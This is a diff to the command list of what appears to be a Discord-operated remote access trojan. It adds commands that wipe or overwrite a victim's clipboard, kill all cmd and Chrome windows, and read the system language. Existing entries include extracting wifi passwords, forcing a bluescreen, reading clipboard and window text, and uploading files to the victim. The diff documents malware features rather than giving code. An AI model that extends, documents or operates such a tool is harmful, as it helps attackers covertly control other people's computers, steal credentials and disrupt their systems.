@@ -16,6 +16,8 @@
 !allproc {ID} 			       >> Lists all current curring processes.
 !showerror {ID} {TITLE} {MESSAGE}      >> Shows error message. Change {TITLE} To your own title and {MESSAGE} TO your own message.
 !clipboard {ID} 		       >> Gets Client clipboard.
+!delclipboard {ID}        >> Delete current clipboard
+!setclipboared {ID} {CLIPBOARD}     >> set clipboard text replace {CLIPBOARD} with the text
 !cd {ID} {DIR}		               >> Change dir to dir given.
 !wallpaper {ID} {PATH}                 >> Changes walpaper to given dir. NOTE: "GIVE WHOLE DIR, else the wallpaper is black".
 !volumemax {ID}			       >> Maxes out the volume of client.
@@ -27,6 +29,9 @@
 !wifipw {ID} 			       >> Extracts wifi passwords.
 !bluescreen {ID} 		       >> Bluescreen's client.
 !window {ID} 			       >> Get client window text. 
+!tercmd {ID}                     >> Terminate all cmd windows untill program is closed
+!terchrome {ID}                   >> Terminate all chrome windows untill program is closed
+!syslan {ID}  >> Get computer language
 
 # Files
 !upload {ID} {LINK} {NAME} / {PATH}    >> Uploads a file. Trough link. you can upload a file in the #upload channel and copy link from there. Enter file or path to store file.
